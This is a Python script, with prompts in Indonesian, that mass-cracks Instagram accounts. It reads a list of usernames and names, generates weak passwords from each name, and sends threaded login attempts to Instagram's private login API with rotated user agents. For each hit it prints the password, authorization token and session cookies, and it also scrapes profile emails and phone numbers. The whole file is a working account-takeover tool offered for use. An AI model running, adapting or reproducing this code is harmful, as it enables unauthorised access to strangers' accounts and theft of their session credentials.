import os,random, time, uuid, requests,datetime
from concurrent.futures import ThreadPoolExecutor
from rich.panel import Panel 
from rich import print as prints
import time
from rich.tree import Tree
from rich.columns import Columns
from rich.progress import Progress,BarColumn,TextColumn, SpinnerColumn

Uid= []
Ok, Cp, Loop = 0, 0, 0
HEADERS   = {'Host': 'www.instagram.com','x-ig-app-id': '1217981644879628','x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E','sec-fetch-site': 'same-origin','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
ses = requests.Session()
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
Okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
Cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'

def UserAgentBarcelona():
    try:
        with open("useragent.txt", "r") as f:
            user_agents = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("File useragent.txt tidak ditemukan.")
        return None
    if not user_agents:
        print("File useragent.txt kosong.")
        return None
    return random.choice(user_agents)

def crack_file():
    os.system('clear')
    prints(Panel.fit(f"[bold white] Ini adalah Script crack file selamat mencoba",style="blue"))
    file = input(f'└──╭➣ Masukan Nama File : ')
    try:
        uuid = open(file,'r').readlines()
        for data in uuid:
            try:Uid.append(data.strip())
            except:exit(f" [ - ] pemisah salah")
            print('\rsedang dump %s id'%(len(Uid)),end=" ")
            time.sleep(0.0000003)
    except FileNotFoundError:exit(f"File Tidak Terbaca")
    prints(f'\rtotal akun dump adalah [bold green]{len(Uid)}[bols white]')
    metode_login()

def metode_login(): 
	Meledak = []
	Meledak.append(Panel.fit(f"[bold white]1. Instagram With SmartLock [ APPS ]",style="blue"))
	prints(Columns(Meledak))
	method = input("└──╭➣ Pilih Metode 1 Dan 2 : ")
	if method == '1':
		login_method = "api.instagram.com"
	else:
		prints(Panel.fit(f"[bold white] Pilihan tidak valid, menggunakan metode default (API).",style="blue"))
		login_method = "api.instagram.com"
	set_crack(login_method)


def set_crack(login_method):
    global prog,des
    prints(Panel.fit(f"[bold white]Memulai proses crack dengan metode:[bold green] {login_method}[bold white]",style="blue"))
    prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
    des = prog.add_task('',total=len(Uid))
    with prog:
        with ThreadPoolExecutor (max_workers=30) as ASF:
            for i in Uid:
                try:
                    username, name = i.split('|')
                    kontol = Password(name)
                    if login_method == "api.instagram.com":
                        ASF.submit(crack_ajax, username, kontol)
                    else:
                        ASF.submit(crack_ajax, username, kontol)
                except:pass
        exit(' \n\n Crack Telah Selesai')
    
def Password(name):
    xxzx = []
    full = name.replace('_', ' ').replace('.', ' ').replace('@', ' ')
    for nama in full.split(' '):
        if len(nama) < 3:
            continue
        base_nama = nama.replace(' ', '')
        xxzx.append(base_nama)
        xxzx.append(base_nama + '123')
        xxzx.append(base_nama + '1234')
        xxzx.append(base_nama + '12345')
        xxzx.append(base_nama + '123456')
        if len(nama) >= 4:
            xxzx.append(base_nama + '12')
            xxzx.append(base_nama + '123')
            xxzx.append(base_nama + '1234')
            xxzx.append(base_nama + '12345')
            xxzx.append(base_nama + '123456')
        else:
            xxzx.append('kamu nanya')
            xxzx.append('sayangku123')
            xxzx.append('Bengkulu')
    return xxzx

def data_target(name):
    for y in name.split(','):
        try:
            HEADERS.update({'user-agent'  : 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)','x-ig-app-id' :'1217981644879628'})
            profil_info_target = ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={y}', headers = HEADERS).json()['data']['user']
            post      = profil_info_target["edge_owner_to_timeline_media"]["count"]
            peng  = profil_info_target["edge_followed_by"]["count"]
            meng = profil_info_target["edge_follow"]["count"]
            mail = profil_info_target["business_email"]
            phone = profil_info_target["business_phone_number"]
            fullname = profil_info_target["full_name"]
            fbid = profil_info_target["fbid"]
        except Exception as e:
            post, peng, meng, mail, fullname, fbid, phone = None, None, None, None, None,  None, None
    return post, peng, meng, mail, fullname, fbid, phone

def crack_ajax(username, memek):
    global Ok, Cp, Loop
    prog.update(des, description=f'Runing [ {Loop} ] [ {str(len(Uid))} ] True [ {Ok} ] False [ {Cp} ]')
    prog.advance(des) 
    for password in memek:
        try:
            csrf_response = ses.get("https://b.i.instagram.com/")
            csrftoken = csrf_response.cookies.get_dict().get("csrftoken", "missing")
            ua = UserAgentBarcelona()
            device_id = str(uuid.uuid4())
            headers = {
                'User-Agent': ua,
                'X-IG-App-ID': '936619743392459',
                'X-Requested-With': 'XMLHttpRequest',
                'Accept': '/',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://i.instagram.com',
                'Referer': 'https://i.instagram.com/',
                'Accept-Language': 'en-US,en;q=0.9',
                "Sec-Ch-Ua-Platform": '"macOS"',
                "Sec-Ch-Ua-Platform-Version": '"14.6.1"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin"
            }
            data = {
                "device_id": device_id,
                "username": username,
                "password": password,
                "_uuid": str(uuid.uuid4()),
                "requestsUUID":str(uuid.uuid4()),
                "_csrftoken": csrftoken,
                "login_attempt_count": 0
            }
            response = ses.post(
                'https://i.instagram.com/api/v1/accounts/login/',
                data=data,
                headers=headers
            )
            if 'logged_in_user' in response.text:
                Ok += 1
                tree = Tree(Panel.fit("[green]Login Berhasil[/green]"))
                ig_set_authorization = response.headers.get('ig-set-authorization', 'Tidak Ada')
                cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
                tree.add(Panel.fit(f"Username: [green]{username}[/green]"))
                tree.add(Panel.fit(f"Password: [green]{password}[/green]"))
                tree.add(Panel.fit(f"Token: [green]{ig_set_authorization}[/green]"))
                tree.add(Panel.fit(f"Cookie: [green]{cookie}[/green]"))
                prints(tree)
                break
            elif 'challenge_required' in response.text:
                tree = Tree(Panel.fit("[yellow]Login Challenge Required[/yellow]"))
                cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
                tree.add(Panel.fit(f"Username: [yellow]{username}[/yellow]"))
                tree.add(Panel.fit(f"Password: [yellow]{password}[/yellow]"))
                tree.add(Panel.fit(f"User Agent: [yellow]{ua}[/yellow]"))
                tree.add(Panel.fit(f"Cookies Challenge: [yellow]{cookie}[/yellow]"))
                prints(tree)
                Cp += 1
                break
            elif 'Update your app to log in with two-factor authentication' in response.text:
                tree = Tree(Panel.fit("[yellow]Login Checkpoint Email Validation[/yellow]"))
                cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
                tree.add(Panel.fit(f"Username: [yellow]{username}[/yellow]"))
                tree.add(Panel.fit(f"Password: [yellow]{password}[/yellow]"))
                tree.add(Panel.fit(f"User Agent: [yellow]{ua}[/yellow]"))
                tree.add(Panel.fit(f"Cookies Challenge: [yellow]{cookie}[/yellow]"))
                prints(tree)
                Cp += 1
                break
            else:
                continue
        except requests.exceptions.ConnectionError:time.sleep(20)
    Loop+=1
	
if __name__ == '__main__':
    crack_file()
